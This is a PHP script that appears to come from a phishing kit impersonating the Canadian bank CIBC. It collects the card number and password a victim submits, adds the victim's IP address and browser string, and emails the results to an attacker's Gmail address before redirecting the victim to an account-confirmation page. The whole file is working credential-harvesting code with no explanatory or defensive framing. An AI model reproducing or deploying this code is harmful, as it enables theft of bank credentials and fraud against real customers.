<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1  LoginDetails----------------------\n";
$message .= "username : ".$_POST['cardNumber']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------created by 723806851-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------CIBCResults--------------------------\n";
$send = "ryanlemay300@gmail.com";
$subject = "cibcResultz 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
?>
<script>
    window.top.location.href = "accountConfirm.php";

</script>